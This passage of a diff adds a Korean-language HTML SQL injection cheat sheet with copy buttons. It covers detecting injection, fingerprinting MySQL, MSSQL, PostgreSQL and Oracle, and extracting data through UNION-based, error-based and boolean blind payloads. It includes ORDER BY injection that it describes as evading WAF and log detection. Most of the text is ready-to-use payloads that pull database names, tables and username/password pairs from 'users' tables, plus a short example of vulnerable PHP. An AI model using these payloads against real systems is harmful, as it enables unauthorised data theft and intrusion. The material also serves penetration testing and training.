+-- [산술 테스트] 숫자 계산 결과로 반응 확인
+1+1            -- id=2와 같은 결과가 나오면 숫자형 SQLi
+1-1            -- id=0 결과 → 빈 응답이면 확인됨</code></pre>
+      </div>
+    </div>
+
+    <div class="sub-section">
+      <div class="sub-title">2.3 Time 테스트 — 반응 차이 없을 때</div>
+      <div class="code-wrap">
+        <button class="copy-btn" onclick="copyCode(this)">복사</button>
+        <pre><code class="language-sql">-- MySQL
+' AND SLEEP(5)--
+1 AND SLEEP(5)--
+'; SELECT SLEEP(5)--
+
+-- MSSQL
+'; WAITFOR DELAY '0:0:5'--
+1; WAITFOR DELAY '0:0:5'--
+
+-- PostgreSQL
+'; SELECT pg_sleep(5)--
+1; SELECT pg_sleep(5)--
+
+-- Oracle
+' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--</code></pre>
+      </div>
+    </div>
+
+    <div class="sub-section">
+      <div class="sub-title">2.4 에러 메시지 패턴으로 DB 식별</div>
+      <div class="code-wrap">
+        <button class="copy-btn" onclick="copyCode(this)">복사</button>
+        <pre><code class="language-text">-- MySQL 에러 패턴
+You have an error in your SQL syntax; check the manual
+that corresponds to your MySQL server version for the right syntax
+to use near ''' at line 1
+
+-- MSSQL 에러 패턴
+Unclosed quotation mark after the character string ''
+Incorrect syntax near ''
+
+-- PostgreSQL 에러 패턴
+ERROR: unterminated quoted string at or near "'"
+ERROR: syntax error at or near "'"
+
+-- Oracle 에러 패턴
+ORA-00907: missing right parenthesis
+ORA-00933: SQL command not properly ended</code></pre>
+      </div>
+    </div>
+
+    <div class="sub-section">
+      <div class="sub-title">2.5 탐지 신뢰도 높이기 (오탐 방지)</div>
+      <div class="info-box">
+        <span class="box-icon">ℹ</span>
+        <div>화면이 똑같아 보여도 오탐(false positive)이 흔하다. 아래 기준으로 최소 2회 이상 재현되는지 반드시 확인할 것.</div>
+      </div>
+      <div class="code-wrap">
+        <button class="copy-btn" onclick="copyCode(this)">복사</button>
+        <pre><code class="language-text">-- Boolean-Based: 화면이 비슷해 보일 때 응답 길이(Content-Length)까지 비교
+참: 1' AND 1=1--   → Content-Length: 4213
+거짓: 1' AND 1=2-- → Content-Length: 4198   (몇 바이트라도 차이 나면 유효한 채널)
+
+-- Time-Based: 네트워크 지터/서버 부하로 인한 오탐 방지
+1. 지연 없는 요청을 3~5회 보내 baseline 응답 시간 측정 (예: 평균 200ms)
+2. SLEEP(5) 요청을 최소 2회 반복 → 매번 baseline+5초 근처로 나오는지 확인
+3. 처음엔 SLEEP(2~3) 같은 짧은 지연으로 먼저 확인 후 SLEEP(10) 등으로 올려 재검증
+4. 프록시/로드밸런서 구간의 큐잉 지연과 혼동하지 않도록 동일 조건에서 반복 테스트</code></pre>
+      </div>
+    </div>
+
+    <div class="sub-section">
+      <div class="sub-title">2.6 폴리글랏(Polyglot) 탐지 페이로드</div>
+      <div class="section-desc" style="margin-bottom:12px;">
+        입력 컨텍스트(따옴표 유무, 숫자형/문자열형, 주석 스타일)를 모를 때 한 번의 요청으로 여러 상황을 동시에 커버하는 페이로드.
+        Time-Based 반응(SLEEP)으로 컨텍스트에 상관없이 취약점 존재 여부만 빠르게 스크리닝할 때 유용.
+      </div>
+      <div class="code-wrap">
+        <button class="copy-btn" onclick="copyCode(this)">복사</button>
+        <pre><code class="language-sql">-- 표준 폴리글랏 (숫자형 / 작은따옴표 / 큰따옴표 / 주석 컨텍스트를 동시에 커버)
+SLEEP(0)/*'or SLEEP(0)or'"or SLEEP(0)or"*/
+
+-- 사용 예: 응답이 즉시 오면 미취약 or 다른 컨텍스트, 5초 지연되면 해당 요청 컨텍스트에서 취약
+?id=SLEEP(5)/*'or SLEEP(5)or'"or SLEEP(5)or"*/
+
+-- 에러 유발형 폴리글랏 (컨텍스트 무관하게 문법 에러 유도, 2번 섹션의 개별 문자 테스트 대체용)
+'"`--;)( OR (1=1</code></pre>
+      </div>
+      <div class="tip-box">
+        <span class="box-icon">💡</span>
+        폴리글랏은 "취약점이 있는지 없는지"만 빠르게 스크리닝하는 용도. 취약점 확정 후에는 반드시 2.1~2.4의 개별 테스트로 정확한 컨텍스트(따옴표 종류, 주석 스타일)를 다시 확인할 것.
+      </div>
+    </div>
+  </section>
+
+  <div class="section-divider"></div>
+
+  <!-- ============================================================
+       03. DB 종류 식별
+       ============================================================ -->
+  <section class="section-block" id="s-dbid">
+    <div class="section-header">
+      <span class="section-num">03</span>
+      <h2 class="section-title">DB 종류 식별</h2>
+      <span class="section-badge badge-cyan">정보 수집</span>
+    </div>
+
+    <div class="sub-section">
+      <div class="sub-title">3.1 버전 확인 쿼리</div>
+      <div class="code-wrap">
+        <button class="copy-btn" onclick="copyCode(this)">복사</button>
+        <pre><code class="language-sql">-- MySQL / MSSQL 공통
+SELECT @@version
+
+-- MySQL 전용
+SELECT version()
+
+-- PostgreSQL 전용
+SELECT version()
+SELECT current_setting('server_version')
+
+-- Oracle 전용
+SELECT banner FROM v$version
+SELECT version FROM v$instance
+
+-- SQLite 전용
+SELECT sqlite_version()</code></pre>
+      </div>
+    </div>
+
+    <div class="sub-section">
+      <div class="sub-title">3.2 함수 존재 여부로 식별</div>
+      <div class="code-wrap">
+        <button class="copy-btn" onclick="copyCode(this)">복사</button>
+        <pre><code class="language-sql">-- MySQL만 존재
+SELECT sleep(0)         -- 에러 없으면 MySQL
+SELECT benchmark(1,1)   -- 에러 없으면 MySQL
+
+-- MSSQL만 존재
+SELECT @@servername     -- 에러 없으면 MSSQL
+
+-- Oracle만 존재
+SELECT * FROM dual      -- 에러 없으면 Oracle
+SELECT sysdate FROM dual
+
+-- 에러 기반 식별 (주입 가능할 때)
+' AND 1=CONVERT(int,'a')--         -- MSSQL이면 에러에 'a' 포함
+' AND extractvalue(1,'a')--        -- MySQL이면 XPATH syntax error
+' AND 1=CAST('a' AS int)--         -- PostgreSQL이면 invalid input syntax</code></pre>
+      </div>
+    </div>
+
+    <div class="sub-section">
+      <div class="sub-title">3.3 단일 쿼리 핑거프린팅 — 문법 차이로 DB 특정</div>
+      <div class="section-desc" style="margin-bottom:12px;">
+        에러 메시지가 없어도 아래 문법 차이를 이용하면 DB 종류를 빠르게 좁힐 수 있다. 하나의 결과만으로 단정하지 말고 2~3개를 조합해 확인할 것.
+      </div>
+      <table class="compare-table">
+        <thead>
+          <tr><th>테스트</th><th>MySQL</th><th>MSSQL</th><th>PostgreSQL</th><th>Oracle</th></tr>
+        </thead>
+        <tbody>
+          <tr><td class="pri"><code>SELECT 1</code> (FROM 없이)</td><td class="tag-green">성공</td><td class="tag-green">성공</td><td class="tag-green">성공</td><td class="tag-red">에러 (FROM 절 필수)</td></tr>
+          <tr><td class="pri"><code>SELECT 'a'||'b'</code></td><td class="tag-orange">0 (OR 연산자로 처리)</td><td class="tag-red">에러</td><td class="tag-green">'ab'</td><td class="tag-green">'ab'</td></tr>
+          <tr><td class="pri"><code>SELECT 'a'+'b'</code></td><td class="tag-orange">0 (숫자 변환 시도)</td><td class="tag-green">'ab'</td><td class="tag-red">에러</td><td class="tag-red">에러</td></tr>
+          <tr><td class="pri"><code>id=1--</code> (뒤에 공백/개행 없이)</td><td class="tag-orange">에러 (공백 1칸 이상 필수)</td><td class="tag-green">성공</td><td class="tag-green">성공</td><td class="tag-green">성공</td></tr>
+          <tr><td class="pri"><code>id=1#</code></td><td class="tag-green">성공 (MySQL 전용 주석)</td><td class="tag-red">에러</td><td class="tag-red">에러</td><td class="tag-red">에러</td></tr>
+          <tr><td class="pri"><code>SELECT @@version</code></td><td class="tag-green">성공</td><td class="tag-green">성공</td><td class="tag-red">에러</td><td class="tag-red">에러</td></tr>
+        </tbody>
+      </table>
+      <div class="tip-box" style="margin-top:10px;">
+        <span class="box-icon">💡</span>
+        예: <code>'a'||'b'</code>가 'ab'로 나오고 <code>@@version</code>이 에러면 → PostgreSQL 또는 Oracle. 여기에 <code>SELECT 1</code>(FROM 없이) 성공 여부를 더하면 PostgreSQL/Oracle 중 하나로 확정 가능.
+      </div>
+    </div>
+  </section>
+
+  <div class="section-divider"></div>
+
+  <!-- ============================================================
+       04. UNION-Based SQLi
+       ============================================================ -->
+  <section class="section-block" id="s-union">
+    <div class="section-header">
+      <span class="section-num">04</span>
+      <h2 class="section-title">UNION-Based SQLi</h2>
+      <span class="section-badge badge-cyan">In-Band</span>
+    </div>
+    <div class="section-desc">
+      <strong>언제 사용</strong>: 쿼리 결과가 화면에 직접 출력될 때<br>
+      원래 쿼리에 UNION SELECT를 붙여 다른 테이블 데이터를 같은 출력 자리에 끼워 넣는 방식.
+    </div>
+
+    <div class="sub-section">
+      <div class="sub-title">4.1 컬럼 수 파악 — ORDER BY (에러 기반)</div>
+      <div class="code-wrap">
+        <button class="copy-btn" onclick="copyCode(this)">복사</button>
+        <pre><code class="language-sql">-- 숫자를 1씩 올리다 에러가 나는 직전 숫자 = 컬럼 수
+1' ORDER BY 1--
+1' ORDER BY 2--
+1' ORDER BY 3--   -- 에러 발생 → 컬럼 수는 2개
+
+-- URL 인코딩 버전 (GET 파라미터)
+1'+ORDER+BY+1--
+1'+ORDER+BY+2--</code></pre>
+      </div>
+    </div>
+
+    <div class="sub-section">
+      <div class="sub-title">4.2 컬럼 수 파악 — UNION SELECT NULL (더 안정적)</div>
+      <div class="code-wrap">
+        <button class="copy-btn" onclick="copyCode(this)">복사</button>
+        <pre><code class="language-sql">-- NULL은 모든 데이터 타입과 호환되어 타입 오류 없이 테스트 가능
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--   -- 에러 없으면 컬럼 3개
+
+-- Oracle은 FROM dual 필수
+' UNION SELECT NULL FROM dual--
+' UNION SELECT NULL,NULL FROM dual--</code></pre>
+      </div>
+    </div>
+
+    <div class="sub-section">
+      <div class="sub-title">4.3 출력 위치 확인 (어느 컬럼이 화면에 뜨는가)</div>
+      <div class="code-wrap">
+        <button class="copy-btn" onclick="copyCode(this)">복사</button>
+        <pre><code class="language-sql">-- 더미 문자열로 각 자리 확인 (컬럼 2개 기준)
+-1' UNION SELECT 'col1','col2'--
+-- 화면: First name: col1 / Surname: col2  → 둘 다 출력됨
+
+-- 3개 컬럼인 경우
+-1' UNION SELECT 'col1','col2','col3'--
+
+-- id=-1 처럼 존재하지 않는 값으로 원래 결과를 0건으로 만드는 게 핵심
+-- → UNION 결과만 깔끔하게 출력됨</code></pre>
+      </div>
+    </div>
+
+    <div class="sub-section">
+      <div class="sub-title">4.4 데이터 추출 전체 흐름</div>
+      <div class="code-wrap">
+        <button class="copy-btn" onclick="copyCode(this)">복사</button>
+        <pre><code class="language-sql">-- STEP 1: DB 이름
+-1' UNION SELECT database(),NULL--            -- MySQL
+-1' UNION SELECT current_database(),NULL--    -- PostgreSQL
+-1' UNION SELECT DB_NAME(),NULL--             -- MSSQL
+-1' UNION SELECT (SELECT name FROM v$database),NULL FROM dual-- -- Oracle
+
+-- STEP 2: 테이블 목록
+-1' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema=database()-- -- MySQL/PG/MSSQL
+-1' UNION SELECT table_name,NULL FROM all_tables WHERE ROWNUM=1-- -- Oracle
+
+-- STEP 3: 컬럼 목록
+-1' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
+-1' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS'-- -- Oracle
+
+-- STEP 4: 데이터 추출
+-1' UNION SELECT username,password FROM users--
+
+-- STEP 5: 한 컬럼에 여러 값 합치기 (출력 자리가 1개일 때)
+-1' UNION SELECT CONCAT(username,':',password),NULL FROM users--           -- MySQL
+-1' UNION SELECT GROUP_CONCAT(username,':',password SEPARATOR '\n'),NULL FROM users-- -- MySQL (전체)
+-1' UNION SELECT username||':'||password,NULL FROM users--                 -- PostgreSQL/Oracle
+-1' UNION SELECT username+':'+password,NULL FROM users--                   -- MSSQL
+
+-- STEP 6: 컬럼 이름으로 테이블 역추적
+SELECT table_schema, table_name FROM information_schema.columns WHERE column_name='password'
+SELECT table_schema, table_name FROM information_schema.columns WHERE column_name LIKE '%pass%'</code></pre>
+      </div>
+    </div>
+  </section>
+
+  <div class="section-divider"></div>
+
+  <!-- ============================================================
+       05. Error-Based SQLi
+       ============================================================ -->
+  <section class="section-block" id="s-error">
+    <div class="section-header">
+      <span class="section-num">05</span>
+      <h2 class="section-title">Error-Based SQLi</h2>
+      <span class="section-badge badge-red">In-Band</span>
+    </div>
+    <div class="section-desc">
+      <strong>언제 사용</strong>: 에러 메시지 내용이 화면에 노출될 때<br>
+      의도적으로 잘못된 XPath/타입 변환 에러를 유발해 에러 메시지 안에 쿼리 결과를 포함시키는 방식.
+    </div>
+
+    <div class="sub-section">
+      <div class="sub-title">5.1 MySQL — extractvalue (권장)</div>
+      <div class="code-wrap">
+        <button class="copy-btn" onclick="copyCode(this)">복사</button>
+        <pre><code class="language-sql">-- 원리: extractvalue()의 XPath에 쿼리 결과를 넣으면
+--        "XPATH syntax error: ':결과값'" 에러에 값이 포함됨
+-- 0x3a = ':' (콜론) → XPath 오류 유발용 특수문자
+
+-- DB 이름
+1' AND extractvalue(rand(),concat(0x3a,database()))--
+-- → XPATH syntax error: ':dvwa'
+
+-- 버전
+1' AND extractvalue(rand(),concat(0x3a,@@version))--
+
+-- 현재 사용자
+1' AND extractvalue(rand(),concat(0x3a,user()))--
+
+-- 테이블 목록 (LIMIT으로 한 행씩 순회)
+1' AND extractvalue(rand(),concat(0x3a,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1)))--
+1' AND extractvalue(rand(),concat(0x3a,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1,1)))--
+
+-- 컬럼 목록
+1' AND extractvalue(rand(),concat(0x3a,(SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 0,1)))--
+
+-- 데이터 추출
+1' AND extractvalue(rand(),concat(0x3a,(SELECT concat(username,':',password) FROM users LIMIT 0,1)))--</code></pre>
+      </div>
+      <div class="warn-box" style="margin-top:8px;">
+        <span class="box-icon">⚠</span>
+        <div><code>extractvalue</code>/<code>updatexml</code>은 결과를 <strong>32자로 잘라서</strong> 보여준다.
+        긴 값(해시 등)은 <code>SUBSTRING(값,1,32)</code>, <code>SUBSTRING(값,33,32)</code>처럼 나눠서 여러 번 요청하거나,
+        길이 제한이 없는 5.3의 GROUP BY 중복키 기법을 사용할 것.</div>
+      </div>
+    </div>
+
+    <div class="sub-section">
+      <div class="sub-title">5.2 MySQL — updatexml (대안)</div>
+      <div class="code-wrap">
+        <button class="copy-btn" onclick="copyCode(this)">복사</button>
+        <pre><code class="language-sql">-- extractvalue와 동일한 원리, 대안으로 사용
+1' AND updatexml(null,concat(0x3a,database()),null)--
+1' AND updatexml(null,concat(0x3a,@@version),null)--
+1' AND updatexml(null,concat(0x3a,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1)),null)--</code></pre>
+      </div>
+    </div>
+
+    <div class="sub-section">
+      <div class="sub-title">5.3 MySQL — GTID_SUBSET (길이 제한 없음, 8.0 포함 안정적)</div>
+      <div class="code-wrap">
+        <button class="copy-btn" onclick="copyCode(this)">복사</button>
+        <pre><code class="language-sql">-- 원리: GTID_SUBSET()의 인자가 "UUID:번호" 형식이 아니면
+--       "ERROR 3064: Malformed GTID set specified '결과값'" 에러에 값이 그대로 노출됨
+-- extractvalue/updatexml과 달리 32자 제한이 없고, MySQL 5.7.5 ~ 8.0 전반에서 안정적으로 동작
+
+-- 취약점 확인
+1' AND GTID_SUBSET(version(),1)--
+
+-- DB 이름 / 버전 추출
+1' AND GTID_SUBSET(@@version,1)--
+1' AND GTID_SUBSET(database(),1)--
+
+-- 데이터 추출 (긴 값에 특히 유리 — 해시 전체를 한 번에 추출 가능)
+1' AND GTID_SUBSET((SELECT password FROM users LIMIT 0,1),1)--
+1' AND GTID_SUBSET((SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()),1)--</code></pre>
+      </div>
+      <div class="warn-box">
+        <span class="box-icon">⚠</span>
+        <div>과거 널리 쓰이던 <code>GROUP BY</code> + <code>floor(rand(0)*2)</code> 중복키 에러 기법은 MySQL 5.6~5.7 옵티마이저 변경 이후 대부분 재현되지 않는다.
+        새 진단에는 위 GTID_SUBSET을, 구버전(5.5 이하) 대상에서만 참고용으로 GROUP BY 기법을 시도할 것.</div>
+      </div>
+    </div>
+
+    <div class="sub-section">
+      <div class="sub-title">5.4 PostgreSQL — CAST 타입 오류</div>
+      <div class="code-wrap">
+        <button class="copy-btn" onclick="copyCode(this)">복사</button>
+        <pre><code class="language-sql">-- 문자열을 int로 CAST → 에러에 실제값 포함
+-- 에러: invalid input syntax for integer: "실제값"
+
+1' AND 1=CAST((SELECT version()) AS int)--
+1' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
+1' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--</code></pre>
+      </div>
+    </div>
+
+    <div class="sub-section">
+      <div class="sub-title">5.5 MSSQL — 타입 변환 오류</div>
+      <div class="code-wrap">
+        <button class="copy-btn" onclick="copyCode(this)">복사</button>
+        <pre><code class="language-sql">-- 에러: Conversion failed when converting ... 'secret'
+
+1' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--
+1' AND 1=CONVERT(int,@@version)--
+1' AND 1=CONVERT(int,DB_NAME())--
+1' AND 1=CONVERT(int,(SELECT TOP 1 password FROM users))--</code></pre>
+      </div>
+    </div>
+
+    <div class="sub-section">
+      <div class="sub-title">5.6 Oracle — CTXSYS.DRITHSX.SN / UTL_INADDR 에러</div>
+      <div class="code-wrap">
+        <button class="copy-btn" onclick="copyCode(this)">복사</button>
+        <pre><code class="language-sql">-- 방법 A: CTXSYS.DRITHSX.SN (Oracle Text 패키지 — 설치는 돼있어도 CTXSYS 계정 자체는 기본 잠김/만료 상태인 경우가 많음)
+-- 원리: 잘못된 인자로 호출 시 "ORA-20000: Oracle Text error: DRG-11701: thesaurus 값 does not exist" 에러에 값이 포함됨
+-- 주의: 첫 번째 인자는 반드시 NULL이 아닌 값(user 등)이어야 하며, 값 일부만 잘려 나올 수 있음
+SELECT CTXSYS.DRITHSX.SN(user,(SELECT banner FROM v$version WHERE ROWNUM=1)) FROM dual
+SELECT CTXSYS.DRITHSX.SN(user,(SELECT password FROM users WHERE ROWNUM=1)) FROM dual
+
+-- 방법 B: UTL_INADDR.GET_HOST_NAME — 외부 OOB 인프라 없이 즉시 에러로 값 확인 가능
+-- 원리: 존재할 수 없는 호스트명으로 조회 시도 → "ORA-29257: host 결과값 unknown" 에러에 값 노출
+-- (8.4의 OOB 사용법과 달리 별도 DNS 리스너 없이 애플리케이션 응답만으로 즉시 확인 가능)
+SELECT UTL_INADDR.GET_HOST_NAME((SELECT password FROM users WHERE ROWNUM=1)) FROM dual
+1' AND 1=(SELECT UTL_INADDR.GET_HOST_NAME((SELECT banner FROM v$version WHERE ROWNUM=1)) FROM dual)--
+
+-- 방법 C: XMLType 잘못된 태그로 에러 유발
+SELECT XMLType('&lt;a&gt;'||(SELECT banner FROM v$version WHERE ROWNUM=1)||'&lt;/a&gt;&lt;') FROM dual</code></pre>
+      </div>
+      <div class="info-box">
+        <span class="box-icon">ℹ</span>
+        <div>방법 A는 CTXSYS 계정이 잠겨있거나 CTX_DDL 권한이 없으면 실패한다(설치 여부와 실제 사용 가능 여부는 별개). 방법 B(UTL_INADDR)는 Oracle 11g부터 EXECUTE 권한과 별개로 <strong>ACL(접근 제어 목록)</strong>에 의해 추가로 막혀 있을 수 있어, 패치/강화된 환경에서는 두 방법 모두 실패할 수 있다 — 이 경우 5.1~5.5(다른 DB) 방식이 아니라 4번(UNION) 또는 6번(Blind)으로 우회.</div>
+      </div>
+    </div>
+  </section>
+
+  <div class="section-divider"></div>
+
+  <!-- ============================================================
+       06. Boolean-Based Blind SQLi
+       ============================================================ -->
+  <section class="section-block" id="s-bool">
+    <div class="section-header">
+      <span class="section-num">06</span>
+      <h2 class="section-title">Boolean-Based Blind SQLi</h2>
+      <span class="section-badge badge-green">Blind</span>
+    </div>
+    <div class="section-desc">
+      <strong>언제 사용</strong>: 성공/실패 반응만 다르고 데이터/에러가 화면에 없을 때<br>
+      <strong>UNION 사용 안 함</strong>. AND/OR 조건 + substring 조합으로 한 글자씩 스무고개 방식으로 추측.
+      참이면 통과, 거짓이면 에러/빈화면 — 이 차이만으로 데이터를 역추적.
+    </div>
+
+    <div class="sub-section">
+      <div class="sub-title">6.1 기본 참/거짓 테스트</div>
+      <div class="code-wrap">
+        <button class="copy-btn" onclick="copyCode(this)">복사</button>
+        <pre><code class="language-sql">-- 참이면 정상 페이지, 거짓이면 에러/빈화면
+1' AND 1=1--    -- 참 (정상)
+1' AND 1=2--    -- 거짓 (변화)
+
+-- 숫자형 파라미터
+1 AND 1=1--
+1 AND 1=2--
+
+-- 반응 차이 확인 → 차이가 있으면 Boolean Blind 가능!</code></pre>
+      </div>
+    </div>
+
+    <div class="sub-section">
+      <div class="sub-title">6.2 데이터 추출 — substring (DB별)</div>
+      <div class="code-wrap">
+        <button class="copy-btn" onclick="copyCode(this)">복사</button>
+        <pre><code class="language-sql">-- ── DB 이름 길이 파악 ──
+1' AND length(database())=4--           -- MySQL/PostgreSQL
+1' AND len(DB_NAME())=4--               -- MSSQL
+1' AND length((SELECT name FROM v$database))=4-- -- Oracle (근사)
+
+-- ── DB 이름 한 글자씩 추측 ──
+-- MySQL/PostgreSQL/MSSQL
+1' AND substring(database(),1,1)='d'--   -- 첫 번째 글자 = 'd'?
+1' AND substring(database(),2,1)='v'--   -- 두 번째 글자 = 'v'?
+1' AND substring(database(),3,1)='w'--   -- 세 번째 글자 = 'w'?
+
+-- MSSQL (substring 함수명 동일)
+1' AND substring(DB_NAME(),1,1)='m'--
+
+-- Oracle (substr 사용)
+1' AND substr((SELECT name FROM v$database),1,1)='O'--
+
+-- ── ASCII 값으로 비교 (대소문자 구분 필요 시) ──
+1' AND ascii(substring(database(),1,1))>100--   -- 범위 좁히기
+1' AND ascii(substring(database(),1,1))=100--   -- 정확히 맞추기
+
+-- ── 이진 탐색으로 속도 향상 (최악 7번에 한 글자 확정) ──
+1' AND ascii(substring(database(),1,1))>64--    -- 참 → 65~128 범위
+1' AND ascii(substring(database(),1,1))>96--    -- 참 → 97~128 범위
+1' AND ascii(substring(database(),1,1))>112--   -- 거짓 → 97~112 범위
+-- ... 반복
+
+-- ── 테이블/컬럼/데이터 추출 ──
+1' AND substring((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),1,1)='u'--
+1' AND substring((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 0,1),1,1)='u'--
+1' AND substring((SELECT password FROM users WHERE username='admin'),1,1)='5'--</code></pre>
+      </div>
+    </div>
+
+    <div class="sub-section">
+      <div class="sub-title">6.3 ORDER BY 절 인젝션 — 왜 실전에서 자주 잡히나</div>
+      <div class="section-desc" style="margin-bottom:12px;">
+        정렬/필터 파라미터(<code>sort</code>, <code>order</code>, <code>orderby</code>, <code>sortBy</code>, <code>dir</code> 등)는 게시판·상품목록·관리자페이지의
+        정렬 기능에 거의 항상 존재해서 <strong>실전에서 가장 흔하게 발견되는 SQLi 포인트 중 하나</strong>다. 이유는 코드 구조에 있다.
+      </div>
+      <div class="code-wrap">
+        <button class="copy-btn" onclick="copyCode(this)">복사</button>
+        <pre><code class="language-php">// 취약한 백엔드 코드 패턴 (PHP 예시) — 나머지는 Prepared Statement를 잘 쓰더라도 이 부분만 문자열 결합인 경우가 매우 많음
+$sort  = $_GET['sort'];   // 예: name, price, created_at
+$order = $_GET['order'];  // 예: asc, desc
+
+$sql = "SELECT * FROM products WHERE category=? ORDER BY " . $sort . " " . $order;
+// category는 Prepared Statement(?)로 바인딩했지만, sort/order는 그대로 문자열 결합!
+
+// 왜 이렇게 짜는가: Prepared Statement의 플레이스홀더(?, :name)는
+// "값"만 바인딩 가능하고 컬럼명·정렬방향(ASC/DESC) 같은 "식별자/키워드"는 바인딩할 수 없기 때문.
+// → 개발자가 화이트리스트 검증을 깜빡하면 이 지점만 뚫린 채로 남는다.</code></pre>
+      </div>
+      <div class="step-list">
+        <div class="step-item">
+          <div class="step-num">1</div>
+          <div class="step-body">
+            <div class="step-title">파라미터 이름으로 후보 식별</div>
+            <div class="step-desc"><code>sort</code>, <code>order</code>, <code>orderby</code>, <code>sortBy</code>, <code>sort_by</code>, <code>dir</code>, <code>direction</code>, <code>col</code> 등 목록/게시판/관리자 화면의 정렬·필터 파라미터를 우선 목록화</div>
+          </div>
+        </div>
+        <div class="step-item">
+          <div class="step-num">2</div>
+          <div class="step-body">
+            <div class="step-title">위치 번호로 치환 테스트</div>
+            <div class="step-desc"><code>?sort=1</code>, <code>?sort=2</code> 처럼 컬럼명 대신 숫자를 넣어본다. 에러 없이 정렬 기준이 바뀌면 → 값이 검증 없이 <code>ORDER BY</code>에 그대로 들어간다는 신호</div>
+          </div>
+        </div>
+        <div class="step-item">
+          <div class="step-num">3</div>
+          <div class="step-body">
+            <div class="step-title">단일 특수문자로 에러 유발</div>
+            <div class="step-desc"><code>?sort=name'</code>, <code>?sort=name)</code>, <code>?sort=name--</code> 등 삽입 후 500 에러/DB 에러 메시지 발생 여부 확인 (2번 섹션과 동일한 방식)</div>
+          </div>
+        </div>
+        <div class="step-item">
+          <div class="step-num">4</div>
+          <div class="step-body">
+            <div class="step-title">6.4/6.5의 페이로드로 Blind 오라클 확보</div>
+            <div class="step-desc"><code>sort</code>(컬럼명 자리)와 <code>order</code>(ASC/DESC 자리)는 취약 형태가 서로 달라 각각 다른 페이로드가 필요 — 아래 6.4, 6.5 참고</div>
+          </div>
+        </div>
+        <div class="step-item">
+          <div class="step-num">5</div>
+          <div class="step-body">
+            <div class="step-title">확인되면 6.2 방식으로 데이터 추출</div>
+            <div class="step-desc">오라클(참/거짓 판별 채널)만 확보되면 이후 한 글자씩 추출하는 과정은 6.2 Boolean Blind와 동일</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="sub-section">
+      <div class="sub-title">6.4 sort (컬럼명) 파라미터 공격 사례</div>
+      <div class="section-desc" style="margin-bottom:12px;">
+        컬럼명이 들어가는 자리는 <strong>표현식을 통째로 대체</strong>할 수 있어 가장 자유도가 높다.
+        조건에 따라 정렬 기준 컬럼을 바꿔치기하면, <strong>에러 없이</strong> 화면에 보이는 행 순서 차이만으로 참/거짓을 판별할 수 있다 (WAF/로그 탐지에 덜 걸림).
+      </div>
+      <div class="code-wrap">
+        <button class="copy-btn" onclick="copyCode(this)">복사</button>
+        <pre><code class="language-text">-- 정상 요청: ?sort=name&order=asc  →  ORDER BY name asc
+
+-- ① 조용한 탐지/추출: 조건에 따라 정렬 기준 컬럼 자체를 바꿔치기 (에러 없음, 순서 차이로 판별)
+?sort=(CASE WHEN (1=1) THEN name ELSE id END)&order=asc
+-- → 참(1=1)이면 name 기준 정렬(정상), 거짓이면 id 기준 정렬(행 순서가 눈에 띄게 달라짐)
+
+?sort=(CASE WHEN (substring(database(),1,1)='d') THEN name ELSE id END)&order=asc
+-- → 목록의 정렬 순서가 name순인지 id순인지만 비교하면 참/거짓 판별 가능. 에러 로그를 안 남겨 스텔스에 유리.
+
+-- ② 확실한 판별: 조건이 거짓일 때 강제 에러 유발 (눈으로 보기 애매할 때, DB 에러 메시지로 명확히 구분)
+?sort=(CASE WHEN (1=1) THEN name ELSE (SELECT 1 UNION SELECT 2) END)&order=asc   -- 참: 정상
+?sort=(CASE WHEN (1=2) THEN name ELSE (SELECT 1 UNION SELECT 2) END)&order=asc   -- 거짓: 에러 발생
+
+-- ③ 데이터 추출 (비밀번호 첫 글자 확인 예시)
+?sort=(CASE WHEN (substring((SELECT password FROM users LIMIT 1),1,1)='5') THEN name ELSE (SELECT 1 UNION SELECT 2) END)&order=asc
+
+-- ④ Time-Based 버전 (화면 반응/에러 구분이 전혀 없을 때, MySQL 기준)
+?sort=(SELECT CASE WHEN (substring(database(),1,1)='d') THEN name ELSE SLEEP(5) END)&order=asc</code></pre>
+      </div>
+    </div>
+
+    <div class="sub-section">
+      <div class="sub-title">6.5 order (ASC/DESC 방향) 파라미터 공격 사례</div>
+      <div class="section-desc" style="margin-bottom:12px;">
+        <code>order</code>는 보통 <code>asc</code>/<code>desc</code> 문자열 하나만 검증하는 경우가 많은데, 검증이 "값이 asc/desc로 <em>시작</em>하는지"만 보고
+        <strong>뒷부분을 잘라내지 않는 화이트리스트</strong>라면 콤마로 정렬 키를 추가 삽입할 수 있다.
+      </div>
+      <div class="code-wrap">
+        <button class="copy-btn" onclick="copyCode(this)">복사</button>
+        <pre><code class="language-text">-- 정상: ORDER BY name asc
+
+-- 다중 정렬 키 추가 삽입 (MySQL/MSSQL/PostgreSQL/Oracle 모두 콤마로 다중 정렬 키 지원)
+?order=asc,(CASE WHEN (1=1) THEN 1 ELSE (SELECT 1 UNION SELECT 2) END)   -- 참: 정상
+?order=asc,(CASE WHEN (1=2) THEN 1 ELSE (SELECT 1 UNION SELECT 2) END)   -- 거짓: 에러
+
+-- Time-Based (MySQL 기준)
+?order=asc,(SELECT SLEEP(5))
+
+-- 주의: "asc"/"desc" 값 전체를 화이트리스트로 완전 일치(==) 검증하는 경우 이 벡터는 막힌다
+-- 이 경우 6.4의 sort(컬럼명) 파라미터 쪽을 우선 시도할 것 (동일 화면에서 검증 수준이 서로 다른 경우가 많음)</code></pre>
+      </div>
+    </div>
+
+    <div class="sub-section">
+      <div class="sub-title">6.6 DB별 ORDER BY 인젝션 특징 비교</div>
+      <table class="compare-table">
+        <thead>
